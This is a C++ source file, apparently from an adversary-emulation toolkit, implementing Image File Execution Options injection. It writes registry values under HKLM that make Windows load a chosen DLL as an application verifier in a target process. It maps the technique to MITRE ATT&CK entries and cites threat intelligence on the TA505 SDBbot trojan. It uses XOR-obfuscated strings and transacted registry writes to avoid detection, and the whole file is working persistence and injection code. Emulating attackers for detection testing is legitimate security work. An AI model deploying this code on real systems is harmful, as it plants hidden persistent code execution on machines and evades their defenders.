#include "verifier.hpp"
#include "registry.hpp"
#include "transactions.hpp"
#include "xor_obfuscation.hpp"

using common::windows_error;
using std::expected, std::unexpected, std::wstring_view, std::span;

/*
 * register_verifier_transacted:
 *      About:
 *          Registers the specified DLL as a verifier DLL for the specified target process by making
 *          the setting the following registry values under the 
 *          HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\target_process.exe
 *          registry key:
 *              - UseFilter set to 0x1
 *              - VerifierDlls set to the specified DLL
 *              - GlobalFlag set to 0x100
 *              - VerifierFlags set to 0x80000000
 *              - FilterFullPath set to the full target process path
 *          Relevant API calls:
 *              RegCreateKeyTransactedW, RegSetKeyValueW
 *      Result:
 *          Specified DLL set as a verifier DLL for the target process as part of image file execution
 *          options injection
 *      MITRE ATT&CK Techniques:
 *          T1546.012: Event Triggered Execution: Image File Execution Options Injection
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 */
expected<void, windows_error>
register_verifier_transacted(
    HANDLE transaction,
    wstring_view executable,
    wstring_view dll
) {
    auto key = common::create_registry_key(
        transaction,
        executable,
        KEY_WRITE,
        HKEY_LOCAL_MACHINE
    );
    if (!key) {
        return unexpected(key.error());
    }

    auto write = common::write_registry(key.value().get(), XOR_WIDE_LIT(L"UseFilter"), 0x1);
    if (!write) {
        return unexpected(write.error());
    }

    auto subkey = common::create_registry_key(
        transaction,
        L"0",
        KEY_WRITE,
        key.value().get()
    );
    if (!subkey) {
        return unexpected(subkey.error());
    }

    write = common::write_registry(subkey.value().get(), XOR_WIDE_LIT(L"VerifierDlls"), dll);
    if (!write) {
        return unexpected(write.error());
    }

    write = common::write_registry(subkey.value().get(), XOR_WIDE_LIT(L"GlobalFlag"), 0x100);
    if (!write) {
        return unexpected(write.error());
    }

    write = common::write_registry(
        subkey.value().get(),
        XOR_WIDE_LIT(L"VerifierFlags"),
        0x80000000
    );
    if (!write) {
        return unexpected(write.error());
    }

    write = common::write_registry(
        subkey.value().get(),
        XOR_WIDE_LIT(L"FilterFullPath"),
        XOR_WIDE_LIT(LR"()" IFEO_FILTER_FULL_PATH)
    );
    if (!write) {
        return unexpected(write.error());
    }

    return {};
}